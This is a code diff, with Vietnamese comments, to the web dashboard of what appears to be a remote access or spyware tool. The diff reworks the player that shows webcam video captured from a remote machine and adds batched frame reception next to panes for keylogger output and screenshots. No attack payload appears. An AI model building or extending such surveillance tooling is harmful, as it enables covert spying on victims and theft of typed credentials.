@@ -67,8 +67,44 @@
         #screen-img { cursor: zoom-in; }
         /* CSS cho Video Player container */
         #view-webcam {
-            text-align: center; padding: 20px; background: #222;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            text-align: center; 
+            padding: 20px; 
+            background: #222;
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center;
+            height: 100%;
+        }
+        #video-player-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            background: #111;
+            padding: 15px;
+            border-radius: 8px;
+        }
+        #video-player-container.hidden {
+            display: none !important;
+        }
+        #video-screen {
+            max-width: 800px !important;
+            width: 100%;
+            height: auto;
+            border: 2px solid #555;
+            border-radius: 4px;
+        }
+        .video-controls {
+            width: 100%;
+            max-width: 800px;
+            background: #333;
+            padding: 10px;
+            box-sizing: border-box;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            border-radius: 4px;
         }
         .btn-download {
             display: inline-block; margin-top: 15px; padding: 10px 20px;
@@ -142,7 +178,7 @@
             </div>
 
             <div id="view-keylog" class="hidden scroll-area" style="padding: 15px;">
-                <textarea id="txtKeylogs" style="width: 95%; height: 95%; background: #222; color: #0f0; font-family: monospace; border: none; padding: 10px; resize: none;" readonly placeholder="Chưa có dữ liệu log..."></textarea>
+                <textarea id="txtKeylogs" style="width: 95%; height: 95%; background: #222; color: #0f0; font-family: monospace; border: none; padding: 10px; resize: none;" readonly placeholder="Chưa có dữ liệu log..." onkeydown="event.preventDefault()"></textarea>
             </div>
 
             <div id="view-screen" class="hidden scroll-area" style="text-align: center; padding: 10px; background: #333; height: 100%;">
@@ -157,19 +193,18 @@
                     ⏳ Đang ghi hình (5s) và nén dữ liệu...
                 </div>
 
-                <div id="video-player-container" class="hidden" style="display: flex; flex-direction: column; align-items: center; margin-top: 10px;">
-                    
-                    <div style="position: relative; border: 2px solid #555; background: black; line-height: 0;">
-                        <img id="video-screen" style="max-width: 640px; width: 100%; height: auto;" />
+                <div id="video-player-container" class="hidden">
+                    <div style="position: relative; background: black; line-height: 0; display: flex; align-items: center; justify-content: center;">
+                        <img id="video-screen" />
                         <div id="replay-overlay" style="position: absolute; top:0; left:0; width:100%; height:100%; display: none; align-items: center; justify-content: center; background: rgba(0,0,0,0.5); cursor: pointer;" onclick="playVideo()">
-                            <span style="color: white; font-size: 50px;">▶</span>
+                            <span style="color: white; font-size: 80px;">▶</span>
                         </div>
                     </div>
 
-                    <div style="width: 640px; max-width: 100%; background: #333; padding: 10px; box-sizing: border-box; display: flex; gap: 10px; align-items: center;">
+                    <div class="video-controls">
                         <button onclick="playVideo()" style="background: #28a745; width: 40px;">▶</button>
                         <button onclick="pauseVideo()" style="background: #dc3545; width: 40px;">⏸</button>
-                        <input type="range" id="video-seeker" min="0" max="100" value="0" style="flex: 1;" oninput="seekVideo(this.value)">
+                        <input type="range" id="video-seeker" min="0" max="100" value="0" style="flex: 1;">
                         <span id="frame-counter" style="color: white; font-family: monospace; font-size: 12px;">0/0</span>
                     </div>
                 </div>
@@ -255,15 +290,46 @@
                     txt.scrollTop = txt.scrollHeight; 
                     log("Đã tải dữ liệu Keylogger.");
                 }
+                // === XỬ LÝ VIDEO BATCH MỚI ===
+                else if (json.type === 'video_start') {
+                    // Bắt đầu nhận video - khởi tạo mảng
+                    videoFrames = [];
+                    currentFrameIdx = 0;
+                    document.getElementById('cam-status').style.display = 'none'; // Che thông báo cũ
+                    document.getElementById('video-player-container').classList.add('hidden'); // Che player cũ nếu có
+                    document.getElementById('loading-cam').style.display = 'block';
+                    log(`Bắt đầu nhận video (${json.count} frames)...`);
+                }
+                else if (json.type === 'video_batch') {
+                    // Nhận batch frames
+                    if (json.frames && json.frames.length > 0) {
+                        json.frames.forEach(frame => {
+                            videoFrames.push(frame.data);
+                        });
+                        log(`Đã nhận batch: ${videoFrames.length} frames tích luỹ...`);
+                    }
+                }
+                else if (json.type === 'video_end') {
+                    // Kết thúc nhận video
+                    document.getElementById('loading-cam').style.display = 'none';
+                    document.getElementById('cam-status').style.display = 'none';
+                    if (videoFrames.length > 0) {
+                        loadVideoPlayer(videoFrames);
+                        log(`✓ Nhận xong video (${videoFrames.length} frames)`);
+                    } else {
+                        log("❌ Không nhận được frame nào");
+                    }
+                }
+                else if (json.type === 'video_stream') {
+                    // Format cũ (nếu server gửi toàn bộ một lần)
+                    document.getElementById('loading-cam').style.display = 'none';
+                    document.getElementById('cam-status').style.display = 'none';
+                    loadVideoPlayer(json.data);
+                    log("Đã nhận video (" + json.data.length + " frames).");
+                }
                 else if (json.trang_thai) {
                     log(`[${json.trang_thai}] ${json.thong_bao}`);
                     if(json.trang_thai === 'thanh_cong') refreshCurrentTab();
-                }
-                else if (json.type === 'video_stream') {
-                    document.getElementById('loading-cam').style.display = 'none';
-                    document.getElementById('cam-status').style.display = 'none';
-                    loadVideoPlayer(json.data); // Gọi hàm Player mới viết
-                    log("Đã nhận video (" + json.data.length + " frames).");
                 }
             } catch (e) {
                 log("Server: " + data);
@@ -511,17 +577,26 @@
     */
 
     function loadVideoPlayer(frames) {
+        if (!frames || frames.length === 0) {
+            log("❌ Lỗi: Không có frames để hiển thị");
+            document.getElementById('video-player-container').classList.add('hidden');
+            return;
+        }
+        
         videoFrames = frames;
         currentFrameIdx = 0;
         
         const player = document.getElementById('video-player-container');
-        player.classList.remove('hidden');
-        player.style.display = 'flex'; // Fix display flex bị class hidden ghi đè
+        if (player) {
+            player.classList.remove('hidden');
+        }
         
         // Cập nhật thanh trượt
         const seeker = document.getElementById('video-seeker');
-        seeker.max = frames.length - 1;
-        seeker.value = 0;
+        if (seeker) {
+            seeker.max = frames.length - 1;
+            seeker.value = 0;
+        }
 
         // Hiển thị frame đầu tiên
         showFrame(0);
@@ -531,9 +606,12 @@
     }
 
     function showFrame(index) {
+        if (!videoFrames || videoFrames.length === 0) return;
         if (index < 0 || index >= videoFrames.length) return;
         
         const img = document.getElementById('video-screen');
+        if (!img) return;
+        
         // Gán ảnh JPEG Base64
         img.src = "data:image/jpeg;base64," + videoFrames[index];
         
